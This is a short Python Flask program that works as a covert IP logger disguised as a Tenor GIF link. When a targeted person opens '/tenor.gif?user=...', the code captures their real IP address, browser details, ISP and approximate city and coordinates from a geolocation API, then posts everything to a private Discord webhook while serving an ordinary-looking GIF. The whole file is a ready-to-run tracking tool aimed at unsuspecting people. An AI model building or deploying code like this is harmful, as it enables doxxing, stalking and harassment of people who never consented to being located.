from flask import Flask, request, send_file
import requests
import os

app = Flask(__name__)

# Pull webhook from Render Environment Variables (set in Render dashboard)
WEBHOOK_URL = os.getenv('WEBHOOK_URL')

def get_location(ip):
    """
    Get approximate location, ISP, coordinates from IP using free ipapi.co
    Returns 'Unknown' for local/VPN/internal IPs (normal behavior)
    """
    try:
        # Skip private/local IPs to avoid useless API calls
        if ip in ['127.0.0.1', '::1', 'localhost'] or ip.startswith(('10.', '172.', '192.168.', '100.')):
            return "Local/Internal", "N/A", "N/A"

        data = requests.get(f"https://ipapi.co/{ip}/json/", timeout=6).json()
        if data.get("error") is True:
            raise ValueError("API error or rate limit")

        city    = data.get("city", "Unknown")
        region  = data.get("region", "Unknown")
        country = data.get("country_name", "Unknown")
        lat     = data.get("latitude")
        lon     = data.get("longitude")
        isp     = data.get("org", "Unknown")
        accuracy = data.get("accuracy_radius", "Unknown")

        location = f"{city}, {region}, {country}".strip(", ")
        coords   = f"({lat}, {lon}) ±{accuracy}km" if lat and lon else "Unknown"

        return location, coords, isp
    except Exception as e:
        print(f"Geolocation failed: {e}")
        return "Unknown", "Unknown", "Unknown"

@app.route('/tenor.gif')
def track():
    # Get real client IP (Render proxy support)
    forwarded = request.headers.get('X-Forwarded-For')
    ip = forwarded.split(',')[0].strip() if forwarded else request.remote_addr

    # Username from query param ?user= (set when sending the link)
    user = request.args.get('user', 'Unknown')

    # Device / browser info
    ua = request.headers.get('User-Agent', 'Unknown')[:120]

    # Geolocation
    location, coords, isp = get_location(ip)

    # Send log to your Discord webhook (private channel)
    if WEBHOOK_URL:
        payload = {
            "content": f"**GIF Clicked**\n"
                       f"**User:** `{user}`\n"
                       f"**IP:** `{ip}`\n"
                       f"**Location:** {location}\n"
                       f"**Coordinates:** `{coords}`\n"
                       f"**ISP:** `{isp}`\n"
                       f"**Device:** `{ua}`..."
        }
        try:
            requests.post(WEBHOOK_URL, json=payload, timeout=6)
        except Exception as e:
            print(f"Webhook failed: {e}")

    # Serve your actual GIF file
    return send_file('tenor.gif', mimetype='image/gif')

# Optional: root route for testing
@app.route('/')
def home():
    return "IP logger active. Use /tenor.gif?user=Name#1234"

if __name__ == '__main__':
    app.run(debug=True)


